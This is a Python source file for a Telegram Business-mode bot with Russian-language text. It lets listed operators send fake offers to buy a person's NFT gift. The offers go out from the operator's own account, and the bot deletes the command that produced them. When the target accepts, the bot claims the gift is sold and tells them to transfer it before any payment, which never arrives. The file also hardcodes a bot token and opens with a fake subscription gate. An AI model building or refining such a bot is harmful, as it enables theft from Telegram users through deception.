import asyncio
import re
import logging
import random
import string
import json
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
    CallbackQuery
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.methods import DeleteBusinessMessages

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9156067759:AAFs17xphiFJubs_W7NZIkuFsFrxrrL7JNo"
BOT_USERNAME = "Ksjdjdksjdhdhdbot"  # без @

# ВЛАДЕЛЕЦ (ты) - имеет полный доступ
OWNER_ID = 8964812547

# Файл для хранения списка доступа
ACCESS_FILE = "access_list.json"

# =============================================
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# ================= ХРАНИЛИЩА =================
generated_offers = {}
pending_offers = {}
active_timers = {}
business_owners = {}   # {business_connection_id: user_id}
last_send_time = 0

# ================= УПРАВЛЕНИЕ ДОСТУПОМ =================

def load_access_list() -> set:
    """Загружает список ID с доступом из файла"""
    if os.path.exists(ACCESS_FILE):
        try:
            with open(ACCESS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return set(int(x) for x in data.get("allowed_ids", []))
        except Exception as e:
            logging.error(f"Ошибка загрузки списка доступа: {e}")
    return set()

def save_access_list(ids: set):
    """Сохраняет список ID с доступом в файл"""
    try:
        with open(ACCESS_FILE, "w", encoding="utf-8") as f:
            json.dump({"allowed_ids": sorted(list(ids))}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"Ошибка сохранения списка доступа: {e}")

# Инициализация списка доступа (владелец всегда имеет доступ)
ALLOWED_IDS = load_access_list()
ALLOWED_IDS.add(OWNER_ID)
save_access_list(ALLOWED_IDS)

# ================= ТЕКСТЫ =================

TEXT_START = (
    f"🌐 <b>Добро пожаловать в Крупнейшую Империю NFT-Подарков!</b> 🌐\n\n"
    f"Здравствуй, дорогой пользователь Telegram! ✨\n\n"
    f"Ты стоишь на пороге самой масштабной и влиятельной экосистемы в сфере NFT-подарков.\n\n"
    f"🔒 <b>Доступ к внутреннему кругу строго ограничен.</b>\n\n"
    f"<i>Нажми «Подписаться», а затем «Проверить», чтобы подтвердить свой статус.</i>"
)

TEXT_GENERATE_OFFER = (
    f"👑 <b>Приветствую в Империи!</b>\n\n"
    f"<b>Как создать оффер:</b>\n"
    f"Отправь мне сообщение в формате:\n"
    f"<code>ru t.me/nft/ChillFlame-123 1200 star</code>\n"
    f"или\n"
    f"<code>en t.me/nft/ChillFlame-123 9 gram</code>\n\n"
    f"<b>Языки:</b> ru / en\n"
    f"<b>Валюты:</b> star / gram\n\n"
    f"<i>После подтверждения ты получишь код. Отправь его в бизнес-чате как <code>off КОД</code>.</i>"
)

TEXT_ACCESS_HELP = (
    f"🔐 <b>Управление доступом</b>\n\n"
    f"<b>Команды (только для владельца):</b>\n"
    f"/add <code>ID</code> — добавить пользователя в список доступа\n"
    f"/remove <code>ID</code> — удалить пользователя из списка доступа\n"
    f"/list — показать всех пользователей с доступом\n"
    f"/access — показать эту справку\n\n"
    f"<i>Владелец (ID: <code>{OWNER_ID}</code>) всегда имеет доступ и не может быть удалён.</i>"
)

def get_offer_text(user_name, user_link, amount, currency, gift_name, gift_url, time_left_str):
    if currency == "star":
        amount_text = f"{amount} ⭐"
    else:
        amount_text = f"💎 {amount} GRAM"

    return (
        f'Пользователь <a href="{user_link}">{user_name}</a>\n'
        f'предлагает Вам <b>{amount_text}</b> за <a href="{gift_url}">{gift_name}</a>\n\n'
        f'<i>Предложение действует ещё\n{time_left_str}</i>'
        f"<a href='{gift_url}'>\u200b</a>"
    )

def get_accepted_text(gift_name, gift_url, stars, currency):
    if currency == "star":
        amount_text = f"{stars} ⭐"
    else:
        amount_text = f"💎 {stars} GRAM"
    return (
        f"Подарок: <a href='{gift_url}'>{gift_name}</a>\n"
        f"успешно продан!\n\n"
        f"<b>Передайте подарок покупателю для зачисления {amount_text}</b>"
    )

def get_declined_text(user_name):
    return (
        f"Пользователь <b>{user_name}</b> отклонил предложение.\n"
        f"Попробуйте предложить цену выше."
    )

# ================= КЛАВИАТУРЫ =================

def get_start_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/+Uo_fY5SuJdVjYTVi", style="primary")],
        [InlineKeyboardButton(text="Проверить статус", callback_data="check_subscription", style="success")]
    ])

def get_confirm_keyboard(msg_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Верно ✅", callback_data=f"confirm_offer|{msg_id}", style="success"),
            InlineKeyboardButton(text="Неверно ❌", callback_data="cancel_offer", style="danger")
        ]
    ])

def get_offer_keyboard(code: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"decline_{code}", style="danger"),
            InlineKeyboardButton(text="Принять", callback_data=f"accept_{code}", style="success")
        ]
    ])

def get_accepted_keyboard(sender_username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={sender_username}", style="success")],
        [InlineKeyboardButton(text="Как передать?", callback_data="how_to_transfer", style="primary")]
    ])

# ================= ФУНКЦИИ =================

def format_gift_name(url: str) -> str:
    try:
        part = url.rstrip("/").split("/")[-1]
        if "-" in part:
            name_part, num_part = part.split("-", 1)
            clean_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_part)
            return f"{clean_name} #{num_part}"
        return part
    except: return "Подарок"

def format_time_left(delta: timedelta) -> str:
    total_seconds = int(delta.total_seconds())
    if total_seconds < 0:
        return "0 ч. 0 мин."
    hours = total_seconds // 3600
    minutes = (total_seconds % 3600) // 60
    return f"{hours} ч. {minutes} мин."

async def update_timer_task(message_id: int):
    while message_id in active_timers:
        data = active_timers[message_id]
        end_time = data["end_time"]
        now = datetime.now()

        if now >= end_time:
            if message_id in active_timers:
                del active_timers[message_id]
            try:
                new_text = get_offer_text(data["user_name"], data["user_link"], data["amount"], data["currency"], data["gift_name"], data["gift_url"], "0 ч. 0 мин.")
                await bot.edit_message_text(
                    chat_id=data["chat_id"],
                    message_id=message_id,
                    text=new_text,
                    reply_markup=data["keyboard"],
                    link_preview_options=LinkPreviewOptions(show_above_text=True)
                )
            except Exception:
                pass
            break

        time_left = format_time_left(end_time - now)
        try:
            new_text = get_offer_text(data["user_name"], data["user_link"], data["amount"], data["currency"], data["gift_name"], data["gift_url"], time_left)
            await bot.edit_message_text(
                chat_id=data["chat_id"],
                message_id=message_id,
                text=new_text,
                reply_markup=data["keyboard"],
                link_preview_options=LinkPreviewOptions(show_above_text=True)
            )
        except Exception as e:
            logging.warning(f"Ошибка обновления таймера: {e}")

        await asyncio.sleep(60)

async def anti_flood_check():
    global last_send_time
    now = asyncio.get_event_loop().time()
    elapsed = now - last_send_time
    if elapsed < 2.0:
        await asyncio.sleep(2.0 - elapsed)
    last_send_time = asyncio.get_event_loop().time()

async def cleanup_task():
    """Периодическая очистка старых данных, чтобы не было OOM."""
    while True:
        try:
            # Ограничиваем размеры словарей
            for store, name in [
                (generated_offers, "generated_offers"),
                (pending_offers, "pending_offers"),
            ]:
                if len(store) > 200:
                    # Удаляем самые старые (dict сохраняет порядок вставки с Python 3.7+)
                    keys_to_remove = list(store.keys())[:len(store) - 200]
                    for k in keys_to_remove:
                        del store[k]
                    logging.info(f"Очищено {len(keys_to_remove)} записей из {name}")

            # Чистим таймеры, которые уже отработали или устарели
            now = datetime.now()
            stale = [mid for mid, d in active_timers.items() if d["end_time"] < now]
            for mid in stale:
                del active_timers[mid]
        except Exception as e:
            logging.error(f"cleanup_task error: {e}")

        await asyncio.sleep(1800)  # раз в 30 минут

# ================= ОБРАБОТЧИКИ =================

@router.business_connection()
async def on_business_connection(connection):
    business_owners[connection.id] = connection.user.id
    logging.info(f"Бот подключен к аккаунту: {connection.user.id}")

@router.message(CommandStart())
async def cmd_start(message: Message):
    if message.from_user.id in ALLOWED_IDS:
        await message.answer(TEXT_GENERATE_OFFER)
        return
    await message.answer(TEXT_START, reply_markup=get_start_keyboard(), link_preview_options=LinkPreviewOptions(is_disabled=True))

@router.callback_query(F.data == "check_subscription")
async def process_check_sub(callback: CallbackQuery):
    await callback.answer("⏳ Ожидайте одобрение заявки.\n\nСовет Империи проверяет вашу подписку.", show_alert=True)

# ================= КОМАНДЫ УПРАВЛЕНИЯ ДОСТУПОМ (только владелец) =================

@router.message(Command("access"))
async def cmd_access(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    await message.answer(TEXT_ACCESS_HELP)

@router.message(Command("add"))
async def cmd_add(message: Message):
    if message.from_user.id != OWNER_ID:
        return

    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Использование: <code>/add ID</code>\nПример: <code>/add 123456789</code>")
        return

    try:
        new_id = int(parts[1].strip())
    except ValueError:
        await message.answer("❌ ID должен быть числом.\nПример: <code>/add 123456789</code>")
        return

    if new_id in ALLOWED_IDS:
        await message.answer(f"ℹ️ Пользователь <code>{new_id}</code> уже есть в списке доступа.")
        return

    ALLOWED_IDS.add(new_id)
    save_access_list(ALLOWED_IDS)
    await message.answer(f"✅ Пользователь <code>{new_id}</code> добавлен в список доступа.")

@router.message(Command("remove"))
async def cmd_remove(message: Message):
    if message.from_user.id != OWNER_ID:
        return

    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Использование: <code>/remove ID</code>\nПример: <code>/remove 123456789</code>")
        return

    try:
        remove_id = int(parts[1].strip())
    except ValueError:
        await message.answer("❌ ID должен быть числом.\nПример: <code>/remove 123456789</code>")
        return

    if remove_id == OWNER_ID:
        await message.answer("❌ Нельзя удалить владельца из списка доступа.")
        return

    if remove_id not in ALLOWED_IDS:
        await message.answer(f"ℹ️ Пользователя <code>{remove_id}</code> нет в списке доступа.")
        return

    ALLOWED_IDS.discard(remove_id)
    save_access_list(ALLOWED_IDS)
    await message.answer(f"✅ Пользователь <code>{remove_id}</code> удалён из списка доступа.")

@router.message(Command("list"))
async def cmd_list(message: Message):
    if message.from_user.id != OWNER_ID:
        return

    if not ALLOWED_IDS:
        await message.answer("📋 Список доступа пуст.")
        return

    lines = ["📋 <b>Пользователи с доступом:</b>\n"]
    for i, uid in enumerate(sorted(ALLOWED_IDS), 1):
        mark = " 👑 <i>(владелец)</i>" if uid == OWNER_ID else ""
        lines.append(f"{i}. <code>{uid}</code>{mark}")

    lines.append(f"\n<b>Всего:</b> {len(ALLOWED_IDS)}")
    await message.answer("\n".join(lines))

# --- Генерация оффера ---

@router.message(F.text.regexp(r"(?i)^(ru|en)\s+(?:https?://)?t\.me/nft/\S+\s+\d+\s+(star|gram)$"))
async def generate_offer(message: Message):
    if message.from_user.id not in ALLOWED_IDS:
        return

    parts = message.text.strip().split()
    lang, gift_url, amount, currency = parts[0].lower(), parts[1], parts[2], parts[3].lower()

    if not gift_url.startswith("http"):
        gift_url = "https://" + gift_url

    user_name = message.from_user.first_name or "Пользователь"
    user_link = f"tg://user?id={message.from_user.id}"
    gift_name = format_gift_name(gift_url)

    if lang == "ru":
        offer_text = get_offer_text(user_name, user_link, amount, currency, gift_name, gift_url, "23 ч. 59 мин.")
    else:
        offer_text = f'User <a href="{user_link}">{user_name}</a> offers\nYou <b>{amount}</b> for <a href="{gift_url}">{gift_name}</a>\n\n<i>Offer valid for another\n23 h. 59 m.</i><a href="{gift_url}">\u200b</a>'

    msg_id = message.message_id
    pending_offers[msg_id] = {
        "text": offer_text,
        "gift_name": gift_name,
        "gift_url": gift_url,
        "stars": amount,
        "currency": currency,
        "sender_username": message.from_user.username
    }

    await message.answer(text=offer_text, reply_markup=get_confirm_keyboard(msg_id), link_preview_options=LinkPreviewOptions(show_above_text=True))

@router.callback_query(F.data.startswith("confirm_offer|"))
async def confirm_offer(callback: CallbackQuery):
    msg_id = int(callback.data.split("|")[1])
    offer_data = pending_offers.get(msg_id)

    if not offer_data:
        await callback.answer("Ошибка: данные устарели.", show_alert=True)
        return

    code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    generated_offers[code] = offer_data

    text = (
        f"✅ <b>Оффер успешно создан!</b>\n\n"
        f"Ваш код:\n"
        f"<code>{code}</code>\n\n"
        f"<b>Отправьте в бизнес-чате:</b>\n"
        f"<code>off {code}</code>\n\n"
        f"<i>Сообщение с командой будет автоматически удалено, а оффер отправлен от вашего имени.</i>"
    )

    empty_keyboard = InlineKeyboardMarkup(inline_keyboard=[])

    try:
        await callback.message.edit_text(text=text, reply_markup=empty_keyboard)
        await callback.answer("Код сгенерирован!")
    except Exception:
        await callback.message.answer(text=text, reply_markup=empty_keyboard)
        await callback.answer("Код сгенерирован!")

@router.callback_query(F.data == "cancel_offer")
async def cancel_offer(callback: CallbackQuery):
    await callback.message.delete()
    await callback.answer("Отменено.")

# --- Бизнес: отправка оффера ---

@router.business_message(F.text.regexp(r"(?i)^off\s+\w+$"))
async def handle_off_command(message: Message):
    if message.from_user.id not in ALLOWED_IDS:
        return

    # ПРОВЕРКА: не чужое ли подключение
    if message.business_connection_id:
        owner_id = business_owners.get(message.business_connection_id)
        if owner_id and owner_id != message.from_user.id:
            logging.info(f"Игнорирую команду от {message.from_user.id} (чужое подключение {owner_id})")
            return

    parts = message.text.strip().split()
    code = parts[1]
    offer_data = generated_offers.get(code)

    if not offer_data:
        await message.answer("Ошибка: код не найден или устарел.")
        return

    await anti_flood_check()

    try:
        sent_message = await message.answer(
            text=offer_data["text"],
            reply_markup=get_offer_keyboard(code),
            link_preview_options=LinkPreviewOptions(show_above_text=True)
        )

        end_time = datetime.now() + timedelta(hours=23, minutes=59)
        active_timers[sent_message.message_id] = {
            "chat_id": message.chat.id,
            "end_time": end_time,
            "user_name": message.from_user.first_name or "Пользователь",
            "user_link": f"tg://user?id={message.from_user.id}",
            "amount": offer_data["stars"],
            "currency": offer_data["currency"],
            "gift_name": offer_data["gift_name"],
            "gift_url": offer_data["gift_url"],
            "keyboard": get_offer_keyboard(code)
        }
        asyncio.create_task(update_timer_task(sent_message.message_id))

    except Exception as e:
        if "PEER_FLOOD" in str(e):
            await message.answer("⚠️ PEER_FLOOD: подождите 6–24 часа.")
        else:
            await message.answer(f"Ошибка отправки: {e}")
        return

    if message.business_connection_id:
        try:
            await bot(DeleteBusinessMessages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            ))
        except Exception as e:
            logging.warning(f"Не удалось удалить команду: {e}")

# --- Обработка кнопок ---

@router.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    if not callback.message:
        return

    if callback.message.message_id in active_timers:
        del active_timers[callback.message.message_id]

    code = callback.data.split("_")[1]
    offer_data = generated_offers.get(code)

    if not offer_data:
        await callback.answer("Ошибка: оффер не найден.", show_alert=True)
        return

    new_text = get_accepted_text(offer_data["gift_name"], offer_data["gift_url"], offer_data["stars"], offer_data["currency"])

    try:
        await callback.message.edit_text(
            text=new_text,
            reply_markup=get_accepted_keyboard(offer_data["sender_username"]),
            link_preview_options=LinkPreviewOptions(show_above_text=True)
        )
        await callback.answer("Оффер принят!")
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@router.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    if not callback.message:
        return

    if callback.message.message_id in active_timers:
        del active_timers[callback.message.message_id]

    user_name = callback.from_user.first_name or "Пользователь"
    new_text = get_declined_text(user_name)

    try:
        await callback.message.edit_text(text=new_text, reply_markup=None)
        await callback.answer("Оффер отклонен.")
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@router.callback_query(F.data == "how_to_transfer")
async def process_how_to_transfer(callback: CallbackQuery):
    await callback.answer(
        "Нажмите «Передать NFT» под сообщением.\n\nВ открывшемся окне появятся три вкладки, выберите «Мои» и нажмите на тот NFT который был предложен.",
        show_alert=True
    )

# ================= ЗАПУСК =================

async def main():
    print("Бот запущен (только Business-режим)...")
    print(f"Владелец: {OWNER_ID}")
    print(f"Пользователей с доступом: {len(ALLOWED_IDS)}")
    asyncio.create_task(cleanup_task())   # <-- очистка памяти
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
